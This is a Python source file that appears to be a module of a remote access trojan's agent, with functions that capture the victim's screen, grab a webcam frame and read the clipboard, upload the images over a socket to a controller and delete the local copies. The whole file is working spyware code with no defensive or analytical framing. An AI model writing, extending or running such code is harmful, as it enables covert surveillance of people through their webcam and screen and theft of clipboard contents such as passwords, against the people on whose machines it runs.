import os
import subprocess
import base64

from agent.core.protocol import reliable_send
from agent.modules.file_ops import upload_file


def screenshot(sock):
    import pyautogui
    try:
        img = pyautogui.screenshot()
        img.save('screen.png')
        upload_file(sock, 'screen.png')
        os.remove('screen.png')
    except Exception as e:
        reliable_send(sock, f'[-] Error taking screenshot: {str(e)}')


def webcam_capture(sock):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            reliable_send(sock, "[-] Webcam not accessible")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite('webcam.png', frame)
            upload_file(sock, 'webcam.png')
            os.remove('webcam.png')
        else:
            reliable_send(sock, "[-] Failed to capture webcam")
    except ImportError:
        reliable_send(sock, "[-] OpenCV not installed")
    except Exception as e:
        reliable_send(sock, f"[-] Webcam error: {str(e)}")


def get_clipboard():
    try:
        output = subprocess.Popen(
            'powershell.exe Get-Clipboard', shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        result = output.stdout.read() + output.stderr.read()
        return result.decode(errors='replace')
    except Exception:
        try:
            import pyperclip
            return pyperclip.paste()
        except Exception:
            return '[-] Error getting clipboard'
